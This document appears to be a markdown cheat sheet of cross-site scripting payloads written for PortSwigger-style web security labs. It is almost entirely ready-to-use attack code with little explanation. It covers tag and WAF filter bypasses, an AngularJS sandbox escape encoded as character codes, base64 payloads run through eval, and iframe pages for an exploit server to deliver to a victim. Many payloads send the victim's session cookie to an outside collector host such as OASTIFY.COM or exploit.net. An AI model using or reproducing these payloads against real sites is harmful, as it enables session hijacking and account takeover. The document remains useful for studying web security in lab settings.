### Identify allowed Tags

```html
<img src=1 onerror=alert(1)>
```

```html
"><svg><animatetransform onbegin=alert(1)>
```

```javascript
<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"fuzzer
```


## Host **iframe** code on exploit server and deliver exploit link to victim.

```html
<iframe src="https://TARGET.net/?search=%22%3E%3Cbody%20onpopstate=print()%3E">  
```

### Reflected XSS into HTML context with most tags and attributes blocked

```javascript
?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

## onpopstate event

```javascript
<iframe onload="if(!window.flag){this.contentWindow.location='https://TARGET.net?search=<body onpopstate=document.location=`http://OASTIFY.COM/?`+document.cookie>#';flag=1}" src="https://TARGET.net?search=<body onpopstate=document.location=`http://OASTIFY.COM/?`+document.cookie>"></iframe>
```

### Bypass Blocked Tags

```html
<iframe src="https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2FOASTIFY.COM%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E">
</iframe>
```

### XSS Assign protocol

```javascript
<script>location.protocol='javascript';</script>#%0adocument.location='http://OASTIFY.COM/?p='+document.cookie//&context=html
```

### Custom Tags not Blocked
Application respond with message _**"Tag is not allowed"**_ when attempting to insert XSS payloads, but if we create a custom tag it is bypassed.

```javascript
<xss+id=x>#x';
```

```javascript
<script>
location = 'https://TARGET.net/?search=<xss+id=x+onfocus=document.location='https://OASTIFY.COM/?c='+document.cookie tabindex=1>#x';
</script>
```

```javascript
<script>
location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location%3D%27https%3A%2F%2FOASTIFY.COM%2F%3Fc%3D%27%2Bdocument.cookie%20tabindex=1%3E#x';
</script>
```

### OnHashChange

```javascript
<iframe src="https://TARGET.net/#" onload="document.location='http://OASTIFY.COM/?cookies='+document.cookie"></iframe>
```

> Note if the cookie is secure with **HttpOnly** flag set enabled, the cookie cannot be stolen using XSS.

> PortSwigger Lab payload perform print.

```js
<iframe src="https://TARGET.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

### Reflected String XSS
```javascript
</script><script>alert(1)</script>
```

```javascript
</script><script>document.location="https://OASTIFY.COM/?cookie="+document.cookie</script>
```

Reflected XSS into a JavaScript string with single quote and backslash escaped

```javascript
</ScRiPt ><img src=a onerror=document.location="https://OASTIFY.COM/?biscuit="+document.cookie>
```

Exploit Server hosting search term reflected vulnerability that is send to victim to obtain their session cookie.

```javascript
<script>
location = "https://TARGET.net/?search=%3C%2FScRiPt+%3E%3Cimg+src%3Da+onerror%3Ddocument.location%3D%22https%3A%2F%2FOASTIFY.COM%2F%3Fbiscuit%3D%22%2Bdocument.cookie%3E"
</script>
```

### Reflected String Extra Escape

```javascript
\'-alert(1)//  

fuzzer\';console.log(12345);//  

fuzzer\';alert(`Testing The backtick a typographical mark used mainly in computing`);//
```

Using a single **backslash**, single quote and **semicolon** we escape out of the JavaScript string variable
```javascript
\';document.location=`https://OASTIFY.COM/?BackTicks=`+document.cookie;//
```

### AngularJS Sandbox Escape
```javascript
1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

```javascript
x=fetch('https://m9w8haeauh0frftrtjdvexkyrpxgl69v.oastify.com/?z='+document.cookie)
```

> The ASCII decimal values for each character in the above payload string, separated by commas. Each number represents the ASCII decimal value of the corresponding character in the payload string.

```javascript
120,61,102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,103,112,57,111,49,56,57,51,106,97,107,49,100,122,101,55,117,116,118,50,114,107,118,114,48,105,54,57,117,122,105,111,46,111,97,115,116,105,102,121,46,99,111,109,47,63,122,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41
```

### XSS via JSON into EVAL
WAF is preventing dangerous search filters and tags, then we bypass WAF filters using JavaScript global variables.


```javascript
"-alert(window["document"]["cookie"])-"
"-window["alert"](window["document"]["cookie"])-"
"-self["alert"](self["document"]["cookie"])-"
```

secjuice: Bypass XSS filters using JavaScript global variables

```javascript
fetch(`https://OASTIFY.COM/?jsonc=` + window["document"]["cookie"])
```

Next is encode payload using [Base64 encoded](https://www.base64encode.org/) value of the above cookie stealer payload.
```javascript
ZmV0Y2goYGh0dHBzOi8vNHo0YWdlMHlwYjV3b2I5cDYxeXBwdTEzdnUxbHBiZDAub2FzdGlmeS5jb20vP2pzb25jPWAgKyB3aW5kb3dbImRvY3VtZW50Il1bImNvb2tpZSJdKQ==
```

> Test payload on our own session cookie in Search function.

```js
"eval(atob("ZmV0Y2goYGh0dHBzOi8vNHo0YWdlMHlwYjV3b2I5cDYxeXBwdTEzdnUxbHBiZDAub2FzdGlmeS5jb20vP2pzb25jPWAgKyB3aW5kb3dbImRvY3VtZW50Il1bImNvb2tpZSJdKQ=="))-"
```
- Using the **eval()** method evaluates or executes an argument.

### Stored XSS

Stored XSS can also be Blind XSS. If alert payload do not trigger

```javascript
<img src="https://EXPLOIT.net/img">
<script src="https://EXPLOIT.net/script"></script>
<video src="https://EXPLOIT.net/video"></video>
```

```javascript
<img src="1" onerror="window.location='https://exploit.net/cookie='+document.cookie">
```

Product and Store lookup
```javascript
?productId=1&storeId="></select><img src=x onerror=this.src='https://exploit.net/?'+document.cookie;>
```

Stored XSS Blog Post
```javascript
<script>
document.write('<img src="https://exploit.net?cookieStealer='+document.cookie+'" />');
</script>
```

